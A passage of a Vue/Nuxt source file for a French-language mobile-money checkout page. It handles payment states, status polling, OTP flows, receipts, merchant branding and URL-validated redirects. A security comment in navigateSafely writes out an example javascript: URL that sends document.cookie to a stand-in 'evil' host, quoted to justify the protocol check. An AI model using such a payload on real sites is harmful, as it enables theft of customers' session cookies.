<script setup lang="ts">
// Deploy: 2026-05-23 — session_status derive fix + auto-redirect on terminal states
import { useFailureCopy } from '~/composables/useFailureCopy'
// Explicit import: this component lives under `components/checkout/atoms/`
// and Nuxt's default auto-import (`pathPrefix: true`) would expose it as
// `<CheckoutAtomsCheckoutStateScreen>` — not the bare `<CheckoutStateScreen>`
// the template uses. Without this import the production bundle silently
// falls back to rendering the custom-element tag, so the entire post-form
// state machine (validating / processing / success / failed / …) shows a
// blank screen. Dev mode tolerated the loose name via a different lookup
// pass, which is why this only surfaced in prod.
import CheckoutStateScreen from '~/components/checkout/atoms/CheckoutStateScreen.vue'
import CheckoutReceipt from '~/components/checkout/atoms/CheckoutReceipt.vue'

definePageMeta({ layout: 'checkout' })

const route = useRoute()
const token = route.params.token as string

const {
  getSession,
  processPayment,
  checkStatus,
  resendOtp,
  emailReceipt,
  downloadReceiptUrl,
  formatAmount,
} = useCheckout()
const { resolveFailureCopy } = useFailureCopy()

/**
 * 16-state state machine driven by the backend `/status` payload + the
 * /process response shape. See `docs/checkout-states.md` (forthcoming)
 * for the full diagram.
 */
type PageState =
  | 'loading'
  | 'session_unknown'
  | 'expired'
  | 'form'
  | 'validating'
  | 'redirecting'
  | 'processing'
  | 'awaiting_ussd'
  | 'awaiting_otp'
  | 'polling_stale'
  | 'success'
  | 'failed'
  | 'timeout'
  | 'aggregator_down'
  | 'merchant_cancelled'
  | 'error'

const loading = ref(true)
const session = ref<any>(null)
const error = ref<string | null>(null)
const pageState = ref<PageState>('loading')
const redirectingTo = ref<string | null>(null)

// R1 audit A11y V12 — dynamic page title so the browser tab + screen
// reader announce the merchant context. Updates reactively when
// `session.merchant.name` arrives.
//
// MUST be declared AFTER `session` ref: unhead invokes the getter
// eagerly during setup to compute the initial title. Calling useHead
// before the ref is declared throws ReferenceError (temporal dead
// zone), crashes the page, and Nuxt falls back to `/` → `/dashboard`.
useHead({
  title: () => {
    const m = session.value?.merchant?.name
    return m ? `Paiement chez ${m}` : 'Paiement sécurisé'
  },
})

// Form (Step 1 + Step 2)
const step = ref<1 | 2>(1)
const selectedOperator = ref('')
const selectedCountry = ref('')
const phone = ref('')
const otp = ref('')
const formError = ref('')
const phoneError = ref('')
const submitting = ref(false)

// Runtime `next_action` block surfaced by the backend.
const nextAction = ref<{ type: string; message?: string; ussdCode?: string; url?: string } | null>(null)

// Polling state
let pollTimer: ReturnType<typeof setTimeout> | null = null
let pollStartedAt = 0
let consecutiveFailures = 0
// R1 audit CRITICAL F4: when stopPolling() runs while an await is in
// flight, the recursive schedulePoll could still fire AFTER cleanup
// because the closure had already entered the await. A monotonic
// generation counter lets every poll iteration check it's still the
// active polling session before scheduling its successor.
let pollGeneration = 0
const POLL_INTERVALS = [3000, 3000, 3000, 3000, 3000, 3000, 3000, 3000, 3000, 3000, 5000, 5000, 5000, 8000]
const POLL_SOFT_TIMEOUT_MS = 3 * 60 * 1000  // 3 min → polling_stale
const POLL_HARD_TIMEOUT_MS = 5 * 60 * 1000  // 5 min → timeout
const VALIDATION_TIMEOUT_MS = 30 * 1000      // /process must respond within 30 s

// R1 audit HIGH F9: track each /process attempt with a unique token
// so a late response (resolved after we've timed out at 30 s) can't
// mutate state belonging to a subsequent submit. Compared on each
// resolution against `currentSubmitToken`.
let currentSubmitToken = 0

// Receipt copy state
const receiptEmailSent = ref(false)
const receiptEmail = ref('')

const otpRequired = computed<boolean>(() => {
  const op = (session.value?.operators || []).find((o: any) => o.code === selectedOperator.value)
  return Boolean(op?.otp_required) || nextAction.value?.type === 'otp'
})

const phoneRequired = computed<boolean>(() => {
  const op = (session.value?.operators || []).find((o: any) => o.code === selectedOperator.value)
  return op?.phone_required !== false
})

const selectedOperatorObj = computed(() =>
  (session.value?.operators || []).find((o: any) => o.code === selectedOperator.value),
)

const phoneFormat = computed(() => selectedOperatorObj.value?.phone_format ?? null)

// Reset OTP whenever the operator changes so a stale value doesn't leak.
watch(selectedOperator, () => {
  otp.value = ''
  phoneError.value = ''
})

// Lifecycle ─────────────────────────────────────────────────────
onMounted(async () => {
  await fetchSession()
  // Trap browser back navigation during in-flight states (R1 audit fix).
  window.addEventListener('beforeunload', onBeforeUnload)
  // R2 audit MED — popstate listener so the OS back button on Android
  // (and the back-swipe on iOS Safari) correctly returns from Step 2
  // to Step 1 instead of leaving the checkout entirely. Without this,
  // a customer mid-flow on mobile loses their selection.
  window.addEventListener('popstate', onPopState)
})

onUnmounted(() => {
  stopPolling()
  // R1 audit F5: cancel any pending auto-redirect so a route change
  // away from the checkout doesn't fire `window.location.href` after
  // the component is gone.
  cancelAutoRedirect()
  window.removeEventListener('beforeunload', onBeforeUnload)
  window.removeEventListener('popstate', onPopState)
})

/**
 * R2 audit MED — handle OS back button correctly.
 *
 * 1. During in-flight states (validating/processing/awaiting_*),
 *    DON'T let the user navigate away accidentally. Push a sentinel
 *    history entry back to re-trap.
 * 2. On Step 2 form, treat back as "return to Step 1" + stop any
 *    pending poll (without this, polling kept firing after a back
 *    navigation, mutating state on a screen the user already left).
 */
function onPopState() {
  const inFlight = ['validating', 'processing', 'awaiting_ussd', 'awaiting_otp'].includes(pageState.value)
  if (inFlight) {
    // Re-push the state so the back press doesn't actually leave the page.
    window.history.pushState({ step: 2, inFlight: true }, '', window.location.pathname + '#pay')
    return
  }
  if (pageState.value === 'form' && step.value === 2) {
    stopPolling()
    step.value = 1
    formError.value = ''
    phoneError.value = ''
  }
}

function onBeforeUnload(e: BeforeUnloadEvent) {
  if (['validating', 'processing', 'awaiting_ussd', 'awaiting_otp'].includes(pageState.value)) {
    e.preventDefault()
    // Older browsers require a returnValue assignment; modern ones use
    // preventDefault. The actual prompt text is browser-controlled.
    e.returnValue = ''
  }
}

// Session fetch ─────────────────────────────────────────────────
async function fetchSession() {
  loading.value = true
  error.value = null

  try {
    const response = await getSession(token)
    session.value = response.data

    if (session.value.customer_phone) {
      phone.value = session.value.customer_phone
    }

    // Pre-select country: customer_country_guess (Cloudflare IP) or
    // first available country in the operator catalogue.
    const guess = (session.value.customer_country_guess || '').toUpperCase()
    const ops = session.value.operators ?? []
    const knownCountries = [...new Set(ops.map((o: any) => o.country).filter((c: string) => c && c !== 'XX'))]
    if (knownCountries.includes(guess)) {
      selectedCountry.value = guess
    } else if (knownCountries.length > 0) {
      selectedCountry.value = knownCountries[0] as string
    }

    pageState.value = 'form'
    step.value = 1
  } catch (e: any) {
    const status = e?.response?.status || e?.status
    // Phase A audit fix: the 409 branch hydrates the receipt from
    // `data.data` (NOT `data.errors` — that was a bug rendering an
    // empty receipt on reload after a delayed webhook).
    const payload = e?.response?._data ?? e?.data ?? {}
    const successData = payload?.data ?? null

    if (status === 410) {
      pageState.value = 'expired'
      session.value = successData
    } else if (status === 409) {
      pageState.value = 'success'
      session.value = successData
    } else if (status === 404) {
      pageState.value = 'session_unknown'
    } else {
      pageState.value = 'error'
      error.value = 'Impossible de charger la session de paiement.'
    }
  } finally {
    loading.value = false
  }
}

// Step transitions ──────────────────────────────────────────────
function onPickMethod(code: string) {
  selectedOperator.value = code
  // Hosted-redirect operators submit immediately (no Step 2 phone form).
  const op = (session.value?.operators || []).find((o: any) => o.code === code)
  if (op?.redirect_flow || op?.phone_required === false) {
    step.value = 2
    handleSubmit()
    return
  }
  step.value = 2
  // Push a history entry so the OS back button returns to Step 1.
  if (typeof window !== 'undefined') {
    window.history.pushState({ step: 2 }, '', `${window.location.pathname}#pay`)
  }
}

function onBack() {
  if (step.value === 2) {
    // R1 audit CRITICAL F1: stop polling when the user navigates back
    // mid-flow. Without this, a still-running poll could mutate state
    // (flip to success/failed) after the user has moved on.
    stopPolling()
    step.value = 1
    formError.value = ''
    phoneError.value = ''
    if (typeof window !== 'undefined' && window.history.state?.step === 2) {
      window.history.back()
    }
  }
}

// Submit + polling ──────────────────────────────────────────────
async function handleSubmit() {
  formError.value = ''
  phoneError.value = ''

  if (!selectedOperator.value) {
    formError.value = 'Veuillez sélectionner un opérateur de paiement.'
    return
  }

  // Pre-flight phone validation against the operator's regex.
  if (phoneRequired.value) {
    const fmt = phoneFormat.value
    if (!phone.value || phone.value.length < 6) {
      phoneError.value = fmt?.national_hint
        ? `Format attendu : ${fmt.national_hint}.`
        : 'Veuillez entrer un numéro de téléphone valide.'
      return
    }
    if (fmt?.national_regex) {
      try {
        const re = new RegExp(fmt.national_regex)
        if (!re.test(phone.value)) {
          phoneError.value = `Numéro invalide pour cet opérateur. Format attendu : ${fmt.national_hint}.`
          return
        }
      } catch {
        // Bad regex from the backend — ignore and let the server validate.
      }
    }
  }

  if (otpRequired.value && (!otp.value || otp.value.trim().length < 4)) {
    formError.value = 'Veuillez saisir le code de paiement (OTP).'
    return
  }

  submitting.value = true
  pageState.value = 'validating'

  // R1 audit HIGH F9: each submit gets a unique token. If the network
  // hangs past 30s and we time out into `failed`, then the user
  // retries (which starts a NEW submit with a new token), the late
  // response from the original /process call must NOT mutate state.
  currentSubmitToken += 1
  const submitToken = currentSubmitToken

  // Hard cap on the /process call duration.
  const timeoutId = setTimeout(() => {
    // Only act if this is still the active submit.
    if (submitToken !== currentSubmitToken) return
    if (pageState.value === 'validating') {
      submitting.value = false
      // Set a structured failure code so the failureCopy template
      // renders the right copy + CTAs instead of falling through to
      // UNKNOWN with an empty reference (R1 audit M9).
      session.value = { ...session.value, failure_code: 'NETWORK_TIMEOUT' } as any
      pageState.value = 'failed'
      // R2 audit MED N3: bump the submit token so the LATE response
      // from the still-in-flight /process call can't mutate state
      // (it would otherwise overwrite our NETWORK_TIMEOUT failure
      // with whatever the server eventually returned — possibly
      // success → user lands on an unexpected success screen).
      currentSubmitToken += 1
    }
  }, VALIDATION_TIMEOUT_MS)

  try {
    // Compose the full E.164 number with the dial-code prefix from
    // the operator's phone_format.
    const fullPhone = phoneRequired.value && phoneFormat.value?.dial_code
      ? `+${phoneFormat.value.dial_code}${phone.value}`
      : (phoneRequired.value ? phone.value : null)

    const response = await processPayment(token, {
      operator: selectedOperator.value,
      phone: fullPhone,
      otp: otpRequired.value ? otp.value.trim() : undefined,
    })
    clearTimeout(timeoutId)
    // R1 audit F9: stale response from a previous submit must NOT
    // mutate state belonging to the current attempt.
    if (submitToken !== currentSubmitToken) return
    const result = response.data as any

    nextAction.value = result.next_action ?? null

    // Redirect-flow aggregators → navigate immediately.
    const redirectTo = result.aggregator_redirect_url
      || (nextAction.value?.type === 'redirection' ? nextAction.value.url : null)
    if (redirectTo) {
      // R1 audit Sec-M6: validate the URL protocol before assigning
      // to window.location.href. A malicious aggregator response
      // returning `javascript:alert(1)` or `data:text/html,...` would
      // otherwise execute in the customer's context.
      const validatedUrl = (() => {
        try {
          const u = new URL(redirectTo)
          return ['http:', 'https:'].includes(u.protocol) ? u : null
        } catch { return null }
      })()
      if (!validatedUrl) {
        pageState.value = 'failed'
        formError.value = "URL de redirection invalide. Recommencez ou contactez le marchand."
        return
      }
      redirectingTo.value = validatedUrl.host
      pageState.value = 'redirecting'
      // Brief delay so the user sees the redirecting screen, not a flash.
      setTimeout(() => { window.location.href = validatedUrl.href }, 400)
      return
    }

    if (result.status === 'completed') {
      nextAction.value = null
      pageState.value = 'success'
      scheduleAutoRedirectToReturnUrl()
    } else if (result.status === 'failed') {
      nextAction.value = null
      pageState.value = 'failed'
    } else if (nextAction.value?.type === 'otp') {
      pageState.value = 'awaiting_otp'
    } else if (nextAction.value?.type === 'ussd') {
      pageState.value = 'awaiting_ussd'
      startPolling()
    } else {
      pageState.value = 'processing'
      startPolling()
    }
  } catch (e: any) {
    clearTimeout(timeoutId)
    if (submitToken !== currentSubmitToken) return
    const status = e?.response?.status || e?.status
    const data = e?.response?._data || e?.data || {}
    // R1 audit F29: 410 from /process means the session expired
    // (e.g. customer took too long on awaiting_otp). Route to the
    // dedicated `expired` state instead of `failed` — different
    // copy + different recovery CTA (return to merchant).
    if (status === 410) {
      pageState.value = 'expired'
    } else if (status === 502 || status === 503 || status === 504) {
      pageState.value = 'aggregator_down'
    } else if (data?.data?.status === 'failed') {
      pageState.value = 'failed'
    } else {
      pageState.value = 'failed'
      formError.value = data?.message || 'Une erreur est survenue lors du traitement.'
    }
  } finally {
    if (submitToken === currentSubmitToken) {
      submitting.value = false
    }
  }
}

function startPolling() {
  // R1 audit CRITICAL F1+F4: cancel any in-flight polling session
  // before opening a new one, and bump the generation so any pending
  // await response from a previous session is ignored on resolution.
  stopPolling()
  pollStartedAt = Date.now()
  consecutiveFailures = 0
  pollGeneration += 1
  schedulePoll(0, pollGeneration)
}

function schedulePoll(iteration: number, generation: number) {
  // Guard against late callbacks: if generation changed (because
  // stopPolling was called and a new session started), bail.
  if (generation !== pollGeneration) return

  const elapsed = Date.now() - pollStartedAt
  if (elapsed >= POLL_HARD_TIMEOUT_MS) {
    stopPolling()
    pageState.value = 'timeout'
    return
  }
  if (elapsed >= POLL_SOFT_TIMEOUT_MS && pageState.value !== 'polling_stale') {
    pageState.value = 'polling_stale'
  }
  const interval = POLL_INTERVALS[Math.min(iteration, POLL_INTERVALS.length - 1)]
  pollTimer = setTimeout(async () => {
    // Guard before any side-effect — even before the await — in case
    // stopPolling was called while this setTimeout was queued.
    if (generation !== pollGeneration) return

    if (document.visibilityState === 'hidden') {
      // Throttle when the tab is hidden — re-schedule without
      // hitting the network.
      schedulePoll(iteration, generation)
      return
    }
    try {
      const response = await checkStatus(token)
      // Re-check generation AFTER the await — between the request
      // and the response, the user may have navigated away.
      if (generation !== pollGeneration) return
      const status = response.data
      consecutiveFailures = 0
      // R1 audit HIGH F10: explicit field merge — never blanket-spread
      // the /status payload over /show data because /status doesn't
      // ship `operators`, `customer_country_guess`, `merchant`, etc.
      // and would clobber them to undefined, breaking the receipt
      // operator label and other downstream reads.
      const merged = {
        ...session.value,
        status: status.session_status,
        failure_code: status.failure_code,
        failure_reason: status.failure_reason,
        transaction_public_id: status.transaction_public_id,
        operator_code: status.operator_code,
        masked_phone: status.masked_phone,
        completed_at: status.completed_at,
        transaction_status: status.transaction_status,
        // Keep the existing return_url / cancel_url since /status
        // also ships them; if they differ, /status is authoritative.
        return_url: status.return_url ?? session.value?.return_url,
        cancel_url: status.cancel_url ?? session.value?.cancel_url,
      }
      session.value = merged as any

      if (status.session_status === 'completed') {
        stopPolling()
        pageState.value = 'success'
        scheduleAutoRedirectToReturnUrl()
      } else if (status.session_status === 'failed') {
        stopPolling()
        pageState.value = 'failed'
      } else if (status.session_status === 'expired') {
        stopPolling()
        pageState.value = 'expired'
      } else if (status.session_status === 'cancelled') {
        stopPolling()
        pageState.value = 'merchant_cancelled'
      } else {
        schedulePoll(iteration + 1, generation)
      }
    } catch {
      // Re-check generation in catch path too.
      if (generation !== pollGeneration) return
      consecutiveFailures += 1
      // 3+ consecutive failures → keep polling but at the slowest rate.
      schedulePoll(Math.max(iteration + 1, POLL_INTERVALS.length - 1), generation)
    }
  }, interval)
}

function stopPolling() {
  if (pollTimer) clearTimeout(pollTimer)
  pollTimer = null
  // Bump the generation so any in-flight await callbacks bail.
  pollGeneration += 1
}

/**
 * R2 audit HIGH UX — manual "Vérifier maintenant" / "J'ai composé le code"
 * button on processing/awaiting_ussd/polling_stale screens. Fires one
 * immediate /status fetch (out-of-band of the regular polling schedule),
 * routes terminal results into the right state and lets the existing
 * polling continue otherwise.
 */
async function manualStatusCheck() {
  try {
    const response = await checkStatus(token)
    const status = response.data
    const merged = {
      ...session.value,
      status: status.session_status,
      failure_code: status.failure_code,
      failure_reason: status.failure_reason,
      transaction_public_id: status.transaction_public_id,
      operator_code: status.operator_code,
      masked_phone: status.masked_phone,
      completed_at: status.completed_at,
      transaction_status: status.transaction_status,
      return_url: status.return_url ?? session.value?.return_url,
      cancel_url: status.cancel_url ?? session.value?.cancel_url,
    }
    session.value = merged as any
    if (status.session_status === 'completed') {
      stopPolling()
      pageState.value = 'success'
      scheduleAutoRedirectToReturnUrl()
    } else if (status.session_status === 'failed') {
      stopPolling()
      pageState.value = 'failed'
    } else if (status.session_status === 'expired') {
      stopPolling()
      pageState.value = 'expired'
    } else if (status.session_status === 'cancelled') {
      stopPolling()
      pageState.value = 'merchant_cancelled'
    }
    // Else: still pending; polling will continue on its own schedule.
  } catch {
    // Silent — the regular polling will retry. Don't surface a banner;
    // the user just got a "no news" outcome which is the same as if
    // they hadn't clicked.
  }
}

// Auto-redirect to merchant after terminal outcome ─────────────
// Success → return_url, failure/expired/cancelled → cancel_url
// (fallback to return_url if cancel_url not provided).
let autoRedirectTimer: ReturnType<typeof setTimeout> | null = null
function scheduleAutoRedirectToReturnUrl() {
  // R2 audit Edge N8: cancel any previously-scheduled timer first.
  // A race between /process success and a polling-success could
  // schedule TWO 8s timers, only the second is referenced by
  // `autoRedirectTimer`, so cancelAutoRedirect later would only
  // clear one — the other fires unconditionally.
  cancelAutoRedirect()
  if (!session.value?.return_url) return
  autoRedirectTimer = setTimeout(() => {
    // R2 audit HIGH: same protocol-validated navigation as the manual
    // path. A merchant-controlled `javascript:` URL must not execute.
    navigateSafely(session.value?.return_url)
  }, 8000)
}

// Symmetric to scheduleAutoRedirectToReturnUrl but for terminal
// non-success outcomes (failed / expired / cancelled). Falls back to
// return_url when cancel_url wasn't provided by the merchant — better
// to return SOMEWHERE than strand the customer on the failure screen.
function scheduleAutoRedirectToCancelUrl() {
  cancelAutoRedirect()
  const target = session.value?.cancel_url || session.value?.return_url
  if (!target) return
  autoRedirectTimer = setTimeout(() => {
    navigateSafely(target)
  }, 8000)
}

function cancelAutoRedirect() {
  if (autoRedirectTimer) {
    clearTimeout(autoRedirectTimer)
    autoRedirectTimer = null
  }
}

// Single source of truth for auto-redirect on TERMINAL states. The
// success path already schedules its own redirect inline (so the
// `pageState = 'success'` site can decide when), but every failure /
// expired / cancelled / timeout transition used to leave the customer
// stranded on the screen with no way back to the merchant. Watching
// pageState here means every site that flips into a terminal-fail
// state gets the 8-second redirect to cancel_url for free.
const TERMINAL_FAIL_STATES = ['failed', 'expired', 'merchant_cancelled', 'timeout', 'aggregator_down']
watch(pageState, (next) => {
  if (TERMINAL_FAIL_STATES.includes(next)) {
    scheduleAutoRedirectToCancelUrl()
  }
})

// Failure copy / retry  ─────────────────────────────────────────
const failureCopy = computed(() => {
  if (pageState.value !== 'failed' && pageState.value !== 'aggregator_down') return null
  const failureCode = session.value?.failure_code
    ?? (pageState.value === 'aggregator_down' ? 'AGGREGATOR_UNREACHABLE' : null)
  const op = selectedOperatorObj.value
  return resolveFailureCopy(failureCode, {
    operatorName: op?.name,
    currency: session.value?.currency,
    amountFormatted: formatAmount(session.value?.amount ?? 0, session.value?.currency ?? 'XOF'),
    reference: session.value?.transaction_public_id,
    merchantName: session.value?.merchant?.name,
    phoneHint: op?.phone_format?.national_hint,
    attemptsRemaining: undefined,
  })
})

function handleRetry() {
  // R1 audit F1: drop any in-flight polling before reopening the form.
  stopPolling()
  // R1 audit F19: hosted-redirect operators don't have a Step 2 form;
  // a retry must restart from Step 1 so the customer can re-pick.
  const op = (session.value?.operators || []).find((o: any) => o.code === selectedOperator.value)
  if (op?.redirect_flow || op?.phone_required === false) {
    handleSwitchMethod()
    return
  }
  pageState.value = 'form'
  step.value = 2
  formError.value = ''
  phoneError.value = ''
}

function handleSwitchMethod() {
  stopPolling()
  pageState.value = 'form'
  step.value = 1
  selectedOperator.value = ''
  formError.value = ''
  phoneError.value = ''
}

// R1 audit MED M16/F8: previously this did NOT transition pageState
// back to `awaiting_otp` — when the user clicked "Recevoir un nouveau
// code" from the FAILED screen (OTP_EXPIRED CTA), they stayed stuck
// on `failed` with no visible OTP input. Now we route back, clear
// the stale code, and surface errors in a screen-level ref so they
// render inside CheckoutStateScreen.
const resendError = ref('')
async function handleResendOtp() {
  resendError.value = ''
  try {
    await resendOtp(token)
    formError.value = ''
    otp.value = ''
    pageState.value = 'awaiting_otp'
  } catch (e: any) {
    resendError.value = e?.data?.message
      ?? "Impossible de renvoyer le code. Recommencez le paiement ou changez d'opérateur."
  }
}

async function handleEmailReceipt() {
  const target = receiptEmail.value || session.value?.customer_email
  if (!target) {
    formError.value = 'Saisissez une adresse email pour recevoir le reçu.'
    return
  }
  try {
    await emailReceipt(token, target)
    receiptEmailSent.value = true
    setTimeout(() => { receiptEmailSent.value = false }, 3000)
  } catch {
    formError.value = "Impossible d'envoyer le reçu pour le moment."
  }
}

/**
 * Safely navigate to a merchant-controlled URL (return_url / cancel_url).
 * R2 audit HIGH: validate the protocol is http(s) before assigning to
 * `window.location.href` — a hostile merchant typing
 * `javascript:fetch('https://evil/?c='+document.cookie)` in their
 * dashboard would otherwise execute on every customer's success
 * screen. Defence-in-depth: the backend Laravel `|url` validator
 * accepts `javascript:` URLs (CVE-2014-1474 territory) so we MUST
 * re-validate client-side before navigating.
 */
function navigateSafely(url: string | null | undefined): boolean {
  if (!url) return false
  try {
    const u = new URL(url)
    if (!['http:', 'https:'].includes(u.protocol)) return false
    window.location.href = u.href
    return true
  } catch {
    return false
  }
}

function redirectToReturn() {
  cancelAutoRedirect()
  navigateSafely(session.value?.return_url)
}

function redirectToCancel() {
  cancelAutoRedirect()
  navigateSafely(session.value?.cancel_url)
}

/**
 * Terminal-state exit URL — prefer cancel_url (the merchant said
 * "abort here"), fall back to return_url, then merchant.website.
 * R2 audit LOW N4: without a fallback, customers on terminal
 * screens (expired/timeout/merchant_cancelled) could land with no
 * exit button if the merchant only set one of the two URLs.
 */
const terminalExitUrl = computed<string | null>(() => {
  const candidates = [
    session.value?.cancel_url,
    session.value?.return_url,
    session.value?.merchant?.website,
  ]
  for (const c of candidates) {
    if (typeof c === 'string' && c !== '') {
      try {
        const u = new URL(c)
        if (['http:', 'https:'].includes(u.protocol)) return u.href
      } catch { /* skip invalid */ }
    }
  }
  return null
})
function redirectToTerminalExit() {
  cancelAutoRedirect()
  if (terminalExitUrl.value) navigateSafely(terminalExitUrl.value)
}

const template = computed(() => session.value?.template || 'default')

/**
 * Pick a foreground color (white or near-black) that meets WCAG AA
 * 4.5:1 against the given hex background. Returns '#111827' (dark
 * neutral) when the merchant picked a light primary (yellow, light
 * green) so the CTA stays readable, otherwise '#ffffff'.
 *
 * R1 audit BLOCKING H7 / A11y V8: previously the orchestrator
 * blindly applied `--ck-primary: &lt;merchant_value&gt;` with no contrast
 * check, leaving white text on yellow at 1.6:1 — utter WCAG fail.
 */
function relativeLuminance(hex: string): number {
  const clean = hex.replace('#', '')
  const fullHex = clean.length === 3
    ? clean.split('').map(c => c + c).join('')
    : clean
  if (fullHex.length !== 6) return 0
  const channels = [0, 2, 4].map(i => {
    const v = parseInt(fullHex.slice(i, i + 2), 16) / 255
    return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4)
  })
  return 0.2126 * channels[0] + 0.7152 * channels[1] + 0.0722 * channels[2]
}
function pickOnPrimary(hex: string): string {
  const l = relativeLuminance(hex)
  // White (#fff, L=1) needs (1 + 0.05) / (L + 0.05) >= 4.5 → L <= 0.179.
  // Dark (#111, L≈0.011) needs (L + 0.05) / 0.061 >= 4.5 → L >= 0.225.
  return l > 0.179 ? '#111827' : '#ffffff'
}
// Whitelist mapping for the radius preset. The backend stores an enum
// key (sharp|soft|rounded|pill) and we materialise it into pixel
// values here — keeping the mapping client-side means a future tweak
// to the scale doesn't require a backend migration.
const RADIUS_MAP: Record<string, string> = {
  sharp: '2px',
  soft: '8px',
  rounded: '12px',
  pill: '24px',
}

// Whitelist mapping for the font preset → real font-family stack. Same
// pattern as RADIUS_MAP. Each stack falls through to a system font so
// the page still renders if a webfont fails to load on a flaky
// connection (common on the African Mobile Money customer base).
const FONT_MAP: Record<string, string> = {
  system: 'system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif',
  inter: '"Inter", system-ui, -apple-system, sans-serif',
  sora: '"Sora", system-ui, -apple-system, sans-serif',
  'ibm-plex': '"IBM Plex Sans", system-ui, -apple-system, sans-serif',
  serif: 'Georgia, "Times New Roman", serif',
}

const brandingStyle = computed(() => {
  const style: Record<string, string> = {}
  const branding = session.value?.merchant?.branding

  // ─── Primary color (existing logic) ─────────────────────────
  const primary = branding?.primary_color
  // R2 audit HIGH: tightened regex to accept ONLY 3-char or 6-char
  // hex. The previous `{3,8}` accepted 4/5/7/8-char forms which
  // either drop through `relativeLuminance` to L=0 (returns white
  // text, which on a light brand color is unreadable — the very V8
  // failure the helper was meant to fix) or break the inline CSS
  // value silently.
  if (primary && /^#(?:[0-9a-fA-F]{3}|[0-9a-fA-F]{6})$/.test(primary)) {
    style['--ck-primary'] = primary
    style['--ck-text-on-primary'] = pickOnPrimary(primary)
    style['--ck-focus-ring'] = primary + '66'
    // R1 audit H2: when the merchant picks the OUTLINE button style, the
    // primary color becomes TEXT on a white background — the opposite
    // contrast direction of the filled case. A light primary (#FFD400)
    // would yield ~1.4:1, unreadable. If the primary's luminance is too
    // high to meet 4.5:1 against white, fall through to the locked text
    // color so the label stays legible. Border keeps the brand hue for
    // visual identity; only the label swaps.
    const lum = relativeLuminance(primary)
    style['--ck-text-on-primary-outline'] = lum > 0.4 ? '#111827' : primary
  }

  // ─── Radius preset ──────────────────────────────────────────
  // Backend validated the enum so the lookup can't miss in normal
  // operation. Belt-and-suspenders: skip the override if the value
  // isn't in our whitelist (handles future BE additions without
  // breaking the page).
  if (branding?.radius && RADIUS_MAP[branding.radius]) {
    style['--ck-r-md'] = RADIUS_MAP[branding.radius]
    // Smaller radii cascade — a "sharp" theme should also reduce
    // --ck-r-sm so chips/badges visually agree.
    style['--ck-r-sm'] = branding.radius === 'sharp' ? '0px' : '4px'
    style['--ck-r-lg'] = branding.radius === 'pill' ? '32px' : '12px'
  }

  // ─── Font preset ────────────────────────────────────────────
  if (branding?.font && FONT_MAP[branding.font]) {
    // Surface as a custom property so atoms can opt in via
    // `font-family: var(--ck-font-family, inherit)`. The page-level
    // .checkout-page already inherits to children.
    style['--ck-font-family'] = FONT_MAP[branding.font]
  }

  return style
})

// Button-style class applied on .checkout-page so the CTA atom (and
// any other primary-action button in atoms/) can branch on it via
// scoped CSS — no inline JS needed in each atom.
const buttonStyleClass = computed(() => {
  const bs = session.value?.merchant?.branding?.button_style
  if (bs && ['filled', 'outline', 'pill'].includes(bs)) return `bs-${bs}`
  return 'bs-filled'
})

// Custom CTA label (merchant override). Empty / null → atoms use
// their default computed label ("Payer 5 000 XOF" etc.). Plain text
// only — atoms render via {{ }}, never v-html. Bounded length on the
// backend (max:30) so we don't have to clamp here.
const ctaLabelOverride = computed<string | null>(() => {
  const v = session.value?.merchant?.branding?.cta_label
  return typeof v === 'string' && v.trim().length > 0 ? v : null
})

const operatorLabel = computed(() => {
  const op = (session.value?.operators || []).find((o: any) => o.code === session.value?.operator_code)
  return op?.name ?? session.value?.operator_code ?? ''
})

// Dispatcher for failure-CTA actions advertised by useFailureCopy.
// Maps the catalogue's action verbs onto the in-component handlers.
function runFailureCta(action: string) {
  switch (action) {
    case 'retry':
      handleRetry()
      break
    case 'switch_method':
      handleSwitchMethod()
      break
    case 'request_new_otp':
      handleResendOtp()
      break
    case 'cancel':
      redirectToCancel()
      break
    case 'contact_merchant':
      if (session.value?.merchant?.support_email) {
        window.location.href = `mailto:${session.value.merchant.support_email}?subject=Paiement%20${session.value?.transaction_public_id || ''}`
      }
      break
  }
}
</script>

<template>
  <div class="checkout-page" :class="[`tpl-${template}`, buttonStyleClass]" :style="brandingStyle">
    <!-- R1 audit A11y V11 — visually-hidden top-level heading so
         screen-reader users get a clear page-purpose anchor before
         the visual hierarchy starts. The visible card headings stay
         at h2/h3. -->
    <h1 class="visually-hidden">
      Paiement{{ session?.merchant?.name ? ` chez ${session.merchant.name}` : '' }}
    </h1>

    <!-- Sandbox banner — promoted from corner badge to full-width strip
         so dev/QA can never miss it. R1 audit A11y V14: role="region"
         (a persistent landmark) instead of role="alert" so SRs don't
         re-announce it on every state transition.  -->
    <div
      v-if="session?.environment === 'sandbox'"
      class="sandbox-banner"
      role="region"
      aria-label="Mode test"
    >
      <strong>MODE TEST</strong> — aucun montant ne sera prélevé. N'utilisez pas un vrai numéro pour ce paiement.
    </div>

    <!-- Header lives INSIDE the card now (Moneroo convention).
         The 3 templates render their own header with merchant logo +
         name + back button. Non-form states (success, failed, etc.)
         use CheckoutStateScreen which has its own minimal layout. -->

    <main class="checkout-main">
      <!-- Loading -->
      <CheckoutStateScreen
        v-if="pageState === 'loading'"
        variant="loading"
        title="Chargement de votre paiement…"
      />

      <!-- Form (Step 1 + Step 2 dispatched to template) -->
      <template v-else-if="pageState === 'form'">
        <CheckoutAbidjan
          v-if="template === 'abidjan'"
          :session="session"
          :step="step"
          :selected-operator="selectedOperator"
          :selected-country="selectedCountry"
          :phone="phone"
          :otp="otp"
          :otp-required="otpRequired"
          :phone-required="phoneRequired"
          :submitting="submitting"
          :form-error="formError"
          :phone-error="phoneError"
          :format-amount="formatAmount"
          @update:selected-operator="(v: string) => selectedOperator = v"
          @update:country="(v: string) => selectedCountry = v"
          @update:phone="(v: string) => phone = v"
          @update:otp="(v: string) => otp = v"
          @pick-method="onPickMethod"
          @back="onBack"
          @submit="handleSubmit"
        />
        <CheckoutCotonou
          v-else-if="template === 'cotonou'"
          :session="session"
          :step="step"
          :selected-operator="selectedOperator"
          :selected-country="selectedCountry"
          :phone="phone"
          :otp="otp"
          :otp-required="otpRequired"
          :phone-required="phoneRequired"
          :submitting="submitting"
          :form-error="formError"
          :phone-error="phoneError"
          :format-amount="formatAmount"
          @update:selected-operator="(v: string) => selectedOperator = v"
          @update:country="(v: string) => selectedCountry = v"
          @update:phone="(v: string) => phone = v"
          @update:otp="(v: string) => otp = v"
          @pick-method="onPickMethod"
          @back="onBack"
